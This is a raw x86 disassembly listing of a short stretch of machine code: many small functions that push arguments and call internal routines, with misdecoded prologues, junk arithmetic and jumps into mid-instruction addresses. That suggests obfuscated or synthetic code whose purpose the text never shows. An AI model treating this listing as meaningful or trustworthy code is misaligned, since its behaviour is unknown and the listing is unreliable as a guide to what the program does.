  4d1093:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1099:	sub    esp,0x28
  4d109c:	lea    edx,ds:0x4d31ec
  4d10a2:	and    ebx,DWORD PTR [ebp-0x8]
  4d10a5:	push   edx
  4d10a6:	mov    ebx,0x0
  4d10ab:	push   ebx
  4d10ac:	call   0x4d1214
  4d10b1:	add    esp,0x4
  4d10b4:	pop    edx
  4d10b5:	push   edx
  4d10b6:	push   ecx
  4d10b7:	push   DWORD PTR [edx+0xb0]
  4d10bd:	push   ebx
  4d10be:	call   0x4d0e4c
  4d10c3:	add    esp,0xc
  4d10c6:	pop    edx
  4d10c7:	push   edx
  4d10c8:	mov    ebx,0x0
  4d10cd:	push   ebx
  4d10ce:	call   0x4d0f70
  4d10d3:	add    esp,0x4
  4d10d6:	pop    edx
  4d10d7:	add    esp,0x28
  4d10da:	pop    ebp
  4d10db:	ret    
  4d10dc:	pop    edi
  4d10dd:	call   DWORD PTR ds:0x4d2098
  4d10e3:	call   edi
  4d10e5:	add    BYTE PTR [eax],al
  4d10e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10ed:	sub    esp,0x50
  4d10f0:	lea    edi,ds:0x4d3098
  4d10f6:	adc    DWORD PTR [ebp-0x18],0xffffff9d
  4d10fa:	push   edi
  4d10fb:	push   eax
  4d10fc:	push   ebx
  4d10fd:	call   0x4d0a88
  4d1102:	add    esp,0x8
  4d1105:	pop    edi
  4d1106:	push   edi
  4d1107:	call   0x4d0e8c
  4d110c:	add    esp,0x4
  4d110f:	pop    edi
  4d1110:	push   edi
  4d1111:	push   0x0
  4d1113:	call   0x4d0d88
  4d1118:	add    esp,0x4
  4d111b:	pop    edi
  4d111c:	add    esp,0x50
  4d111f:	pop    ebp
  4d1120:	ret    
  4d1121:	add    BYTE PTR [eax],al
  4d1123:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1129:	sub    esp,0x40
  4d112c:	mov    esi,0x4d317c
  4d1131:	xor    ecx,edi
  4d1133:	mov    edi,0xfffffff4
  4d1138:	push   edi
  4d1139:	call   0x4d0ff0
  4d113e:	add    esp,0x4
  4d1141:	push   esi
  4d1142:	push   DWORD PTR [esi+0x48]
  4d1145:	push   DWORD PTR [esi+0x1c0]
  4d114b:	push   ebx
  4d114c:	push   edx
  4d114d:	call   0x4d1408
  4d1152:	add    esp,0x10
  4d1155:	pop    esi
  4d1156:	call   0x4d0f94
  4d115b:	add    esp,0x4
  4d115e:	add    esp,0x40
  4d1161:	pop    ebp
  4d1162:	ret    
  4d1163:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1169:	sub    esp,0x44
  4d116c:	lea    ecx,ds:0x4d3128
  4d1172:	sbb    esi,0xbda
  4d1178:	push   ecx
  4d1179:	push   0x0
  4d117b:	call   0x4d0744
  4d1180:	add    esp,0x4
  4d1183:	pop    ecx
  4d1184:	push   ecx
  4d1185:	push   DWORD PTR [ecx+0x68]
  4d1188:	push   eax
  4d1189:	push   ebx
  4d118a:	push   DWORD PTR [ecx+0x1f0]
  4d1190:	call   0x4d12ac
  4d1195:	add    esp,0x10
  4d1198:	pop    ecx
  4d1199:	push   ecx
  4d119a:	mov    edi,0x0
  4d119f:	push   edi
  4d11a0:	call   0x4d0d88
  4d11a5:	add    esp,0x4
  4d11a8:	pop    ecx
  4d11a9:	add    esp,0x44
  4d11ac:	pop    ebp
  4d11ad:	ret    
  4d11ae:	add    BYTE PTR [eax],al
  4d11b0:	pop    edi
  4d11b1:	call   DWORD PTR ds:0x4d2070
  4d11b7:	call   edi
  4d11b9:	add    BYTE PTR [eax],al
  4d11bb:	add    BYTE PTR [edi-0x1],bl
  4d11be:	adc    eax,0x4d2038
  4d11c3:	call   edi
  4d11c5:	add    BYTE PTR [eax],al
  4d11c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11cd:	sub    esp,0x4c
  4d11d0:	lea    esi,ds:0x4d318c
  4d11d6:	xor    DWORD PTR [ebp-0x24],eax
  4d11d9:	push   0x0
  4d11db:	call   0x4d0d88
  4d11e0:	add    esp,0x4
  4d11e3:	push   esi
  4d11e4:	push   edi
  4d11e5:	push   edi
  4d11e6:	push   DWORD PTR [esi+0xf4]
  4d11ec:	push   DWORD PTR [esi+0x188]
  4d11f2:	call   0x4d13b0
  4d11f7:	add    esp,0x10
  4d11fa:	pop    esi
  4d11fb:	call   0x4d08b4
  4d1200:	add    esp,0x4
  4d1203:	add    esp,0x4c
  4d1206:	pop    ebp
  4d1207:	ret    
  4d1208:	pop    edi
  4d1209:	call   DWORD PTR ds:0x4d2094
  4d120f:	call   edi
  4d1211:	add    BYTE PTR [eax],al
  4d1213:	add    BYTE PTR [edi-0x1],bl
  4d1216:	adc    eax,0x4d2010
  4d121b:	call   edi
  4d121d:	add    BYTE PTR [eax],al
  4d121f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1225:	sub    esp,0x40
  4d1228:	lea    esi,ds:0x4d311c
  4d122e:	and    ecx,DWORD PTR [ebp-0x20]
  4d1231:	push   esi
  4d1232:	push   edx
  4d1233:	push   DWORD PTR [esi+0x1f4]
  4d1239:	call   0x4d1164
  4d123e:	add    esp,0x8
  4d1241:	pop    esi
  4d1242:	mov    eax,0x0
  4d1247:	push   eax
  4d1248:	call   0x4d0f70
  4d124d:	add    esp,0x4
  4d1250:	mov    edx,0x0
  4d1255:	push   edx
  4d1256:	call   0x4d0cc8
  4d125b:	add    esp,0x4
  4d125e:	add    esp,0x40
  4d1261:	pop    ebp
  4d1262:	ret    
  4d1263:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1269:	sub    esp,0x44
  4d126c:	lea    ecx,[esi+0xc]
  4d126f:	cmp    ecx,0x27e
  4d1275:	jb     0x4d1267
  4d1277:	push   ecx
  4d1278:	call   0x4d0e8c
  4d127d:	add    esp,0x4
  4d1280:	pop    ecx
  4d1281:	push   ecx
  4d1282:	push   DWORD PTR [ecx+0x19c]
  4d1288:	push   esi
  4d1289:	push   edi
  4d128a:	push   DWORD PTR [ecx+0x94]
  4d1290:	call   0x4d0e04
  4d1295:	add    esp,0x10
  4d1298:	pop    ecx
  4d1299:	push   ecx
  4d129a:	push   0x0
  4d129c:	call   0x4d0cc8
  4d12a1:	add    esp,0x4
  4d12a4:	pop    ecx
  4d12a5:	add    esp,0x44
  4d12a8:	pop    ebp
  4d12a9:	ret    
  4d12aa:	add    BYTE PTR [eax],al
  4d12ac:	mov    edi,edi
  4d12ae:	push   ebp
  4d12af:	mov    ebp,esp
  4d12b1:	sub    esp,0x60
  4d12b4:	lea    eax,ds:0x4d30f0
  4d12ba:	or     edi,DWORD PTR [ebp-0x60]
  4d12bd:	push   eax
  4d12be:	push   esi
  4d12bf:	push   DWORD PTR [eax+0x10c]
  4d12c5:	push   DWORD PTR [eax+0x60]
  4d12c8:	call   0x4d1520
  4d12cd:	add    esp,0xc
  4d12d0:	pop    eax
  4d12d1:	push   eax
  4d12d2:	mov    edx,0x0
  4d12d7:	push   edx
  4d12d8:	call   0x4d0d88
  4d12dd:	add    esp,0x4
  4d12e0:	pop    eax
  4d12e1:	push   eax
  4d12e2:	mov    eax,0x0
  4d12e7:	push   eax
  4d12e8:	call   0x4d0cc8
  4d12ed:	add    esp,0x4
  4d12f0:	pop    eax
  4d12f1:	add    esp,0x60
  4d12f4:	pop    ebp
  4d12f5:	ret    
  4d12f6:	add    BYTE PTR [eax],al
  4d12f8:	pop    edi
  4d12f9:	call   DWORD PTR ds:0x4d2064
  4d12ff:	call   edi
  4d1301:	add    BYTE PTR [eax],al
  4d1303:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1309:	sub    esp,0x50
  4d130c:	mov    edx,0x4d3170
  4d1311:	or     DWORD PTR [ebp-0x20],edi
  4d1314:	push   edx
  4d1315:	push   DWORD PTR [edx+0x108]
  4d131b:	push   DWORD PTR [edx+0x140]
  4d1321:	call   0x4d1448
  4d1326:	add    esp,0x8
  4d1329:	pop    edx
  4d132a:	push   edx
  4d132b:	mov    esi,0xfffffff4
  4d1330:	push   esi
  4d1331:	call   0x4d0ff0
  4d1336:	add    esp,0x4
  4d1339:	pop    edx
  4d133a:	push   edx
  4d133b:	mov    eax,0x0
  4d1340:	push   eax
  4d1341:	call   0x4d0f7c
  4d1346:	add    esp,0x4
  4d1349:	pop    edx
  4d134a:	add    esp,0x50
  4d134d:	pop    ebp
  4d134e:	ret    
  4d134f:	add    BYTE PTR [edi-0x1],bl
  4d1352:	adc    eax,0x4d202c
  4d1357:	call   edi
  4d1359:	add    BYTE PTR [eax],al
  4d135b:	add    BYTE PTR [edi-0x1],bl
  4d135e:	adc    eax,0x4d205c
  4d1363:	call   edi
  4d1365:	add    BYTE PTR [eax],al
  4d1367:	add    BYTE PTR [edi-0x1],bl
  4d136a:	adc    eax,0x4d2078
  4d136f:	call   edi
  4d1371:	add    BYTE PTR [eax],al
  4d1373:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1379:	sub    esp,0x48
  4d137c:	lea    ebx,[ecx+0x144]
  4d1382:	xor    edx,DWORD PTR [ebp-0x18]
  4d1385:	push   ebx
  4d1386:	push   edx
  4d1387:	push   DWORD PTR [ebx+0xec]
  4d138d:	push   esi
  4d138e:	call   0x4d1124
  4d1393:	add    esp,0xc
  4d1396:	pop    ebx
  4d1397:	call   0x4d0e8c
  4d139c:	add    esp,0x4
  4d139f:	push   0x0
  4d13a1:	call   0x4d0f7c
  4d13a6:	add    esp,0x4
  4d13a9:	add    esp,0x48
  4d13ac:	pop    ebp
  4d13ad:	ret    
  4d13ae:	add    BYTE PTR [eax],al
  4d13b0:	mov    edi,edi
  4d13b2:	push   ebp
  4d13b3:	mov    ebp,esp
  4d13b5:	sub    esp,0x44
  4d13b8:	mov    eax,0x4d3140
  4d13bd:	cmp    eax,0x5dfb
  4d13c2:	je     0x4d13b3
  4d13c4:	push   eax
  4d13c5:	push   edi
  4d13c6:	push   DWORD PTR [eax+0xe0]
  4d13cc:	push   DWORD PTR [eax+0x9c]
  4d13d2:	call   0x4d0a3c
  4d13d7:	add    esp,0xc
  4d13da:	pop    eax
  4d13db:	push   eax
  4d13dc:	mov    ecx,0x0
  4d13e1:	push   ecx
  4d13e2:	call   0x4d0cc8
  4d13e7:	add    esp,0x4
  4d13ea:	pop    eax
  4d13eb:	push   eax
  4d13ec:	push   0x0
  4d13ee:	call   0x4d0f7c
  4d13f3:	add    esp,0x4
  4d13f6:	pop    eax
  4d13f7:	add    esp,0x44
  4d13fa:	pop    ebp
  4d13fb:	ret    
  4d13fc:	pop    edi
  4d13fd:	call   DWORD PTR ds:0x4d209c
  4d1403:	call   edi
  4d1405:	add    BYTE PTR [eax],al
  4d1407:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d140d:	sub    esp,0x58
  4d1410:	lea    ecx,[esi-0x24]
  4d1413:	add    DWORD PTR [ebp-0x48],ebx
  4d1416:	push   ecx
  4d1417:	push   edi
  4d1418:	push   edx
  4d1419:	push   esi
  4d141a:	call   0x4d1304
  4d141f:	add    esp,0xc
  4d1422:	pop    ecx
  4d1423:	push   ecx
  4d1424:	lea    ecx,[ecx-0x158]
  4d142a:	push   ecx
  4d142b:	call   0x4d07ac
  4d1430:	add    esp,0x4
  4d1433:	test   eax,eax
  4d1435:	jne    0x4d1424
  4d1437:	pop    ecx
  4d1438:	push   ecx
  4d1439:	call   0x4d08b4
  4d143e:	add    esp,0x4
  4d1441:	pop    ecx
  4d1442:	add    esp,0x58
  4d1445:	pop    ebp
  4d1446:	ret    
  4d1447:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d144d:	sub    esp,0x3c
  4d1450:	mov    esi,0x4d31c8
  4d1455:	adc    ecx,0x5c13
  4d145b:	push   0x0
  4d145d:	call   0x4d11b0
  4d1462:	add    esp,0x4
  4d1465:	push   esi
  4d1466:	push   eax
  4d1467:	push   DWORD PTR [esi+0x10c]
  4d146d:	push   DWORD PTR [esi+0xc0]
  4d1473:	call   0x4d0964
  4d1478:	add    esp,0xc
  4d147b:	pop    esi
  4d147c:	push   0x0
  4d147e:	call   0x4d11b0
  4d1483:	add    esp,0x4
  4d1486:	add    esp,0x3c
  4d1489:	pop    ebp
  4d148a:	ret    
  4d148b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1491:	sub    esp,0x50
  4d1494:	lea    edx,[ebx+0x100]
  4d149a:	mov    DWORD PTR [edx-0x138],0xffffffdd
  4d14a4:	push   edx
  4d14a5:	push   edi
  4d14a6:	push   DWORD PTR [edx+0xa4]
  4d14ac:	call   0x4d0fa0
  4d14b1:	add    esp,0x8
  4d14b4:	pop    edx
  4d14b5:	push   edx
  4d14b6:	mov    ebx,0x0
  4d14bb:	push   ebx
  4d14bc:	call   0x4d1214
  4d14c1:	add    esp,0x4
  4d14c4:	pop    edx
  4d14c5:	push   edx
  4d14c6:	push   0x0
  4d14c8:	call   0x4d0d88
  4d14cd:	add    esp,0x4
  4d14d0:	pop    edx
  4d14d1:	add    esp,0x50
  4d14d4:	pop    ebp
  4d14d5:	ret    
  4d14d6:	add    BYTE PTR [eax],al
  4d14d8:	mov    edi,edi
  4d14da:	push   ebp
  4d14db:	mov    ebp,esp
  4d14dd:	sub    esp,0x28
  4d14e0:	lea    ebx,ds:0x4d3040
  4d14e6:	adc    DWORD PTR [ebp-0x4],0xffffeb3e
  4d14ed:	push   ebx
  4d14ee:	push   edx
  4d14ef:	push   DWORD PTR [ebx+0x1e4]
  4d14f5:	push   edx
  4d14f6:	push   ecx
  4d14f7:	call   0x4d0d0c
  4d14fc:	add    esp,0x10
  4d14ff:	pop    ebx
  4d1500:	mov    eax,0xfffffff4
  4d1505:	push   eax
  4d1506:	call   0x4d0ff0
  4d150b:	add    esp,0x4
  4d150e:	push   0x0
  4d1510:	call   0x4d156c
  4d1515:	add    esp,0x4
  4d1518:	add    esp,0x28
  4d151b:	pop    ebp
  4d151c:	ret    
  4d151d:	add    BYTE PTR [eax],al
  4d151f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1525:	sub    esp,0x30
  4d1528:	lea    esi,[eax+0xd4]
  4d152e:	and    DWORD PTR [esi-0x90],0xf7f
  4d1538:	push   esi
  4d1539:	push   eax
  4d153a:	push   DWORD PTR [esi+0x1f4]
  4d1540:	call   0x4d09f8
  4d1545:	add    esp,0x8
  4d1548:	pop    esi
  4d1549:	lea    edx,[esi-0x1c4]
  4d154f:	push   edx
  4d1550:	call   0x4d07ac
  4d1555:	add    esp,0x4
  4d1558:	test   eax,eax
  4d155a:	jne    0x4d154a
  4d155c:	call   0x4d08b4
  4d1561:	add    esp,0x4
  4d1564:	add    esp,0x30
  4d1567:	pop    ebp
  4d1568:	ret    
  4d1569:	add    BYTE PTR [eax],al
  4d156b:	add    BYTE PTR [edi-0x1],bl
  4d156e:	adc    eax,0x4d2008
  4d1573:	call   edi
  4d1575:	add    BYTE PTR [eax],al
  4d1577:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d157d:	sub    esp,0x44
  4d1580:	mov    ecx,0x4d3178
  4d1585:	or     DWORD PTR [ecx-0x48],0x4e07
  4d158c:	push   ecx
  4d158d:	push   edi
  4d158e:	push   eax
  4d158f:	push   DWORD PTR [ecx+0x17c]
  4d1595:	call   0x4d14d8
  4d159a:	add    esp,0xc
  4d159d:	pop    ecx
  4d159e:	push   ecx
  4d159f:	call   0x4d0e8c
  4d15a4:	add    esp,0x4
  4d15a7:	pop    ecx
  4d15a8:	push   ecx
  4d15a9:	push   0x0
  4d15ab:	call   0x4d0f70
  4d15b0:	add    esp,0x4
  4d15b3:	pop    ecx
  4d15b4:	add    esp,0x44
  4d15b7:	pop    ebp
  4d15b8:	ret    
  4d15b9:	add    BYTE PTR [eax],al
	...
